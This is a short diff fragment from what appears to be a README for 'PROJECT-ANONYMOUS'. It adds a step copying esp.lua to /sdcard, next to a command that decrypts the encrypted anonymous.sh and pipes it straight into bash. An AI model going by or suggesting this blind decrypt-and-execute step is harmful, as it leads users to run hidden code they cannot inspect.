@@ -19,6 +19,7 @@
 
 ```
    cd PROJECT-ANONYMOUS
+   cp esp.lua /sdcard
    openssl enc -d -aes-256-cbc -a -salt -in anonymous.sh | bash -
 ```
 # CHARGES
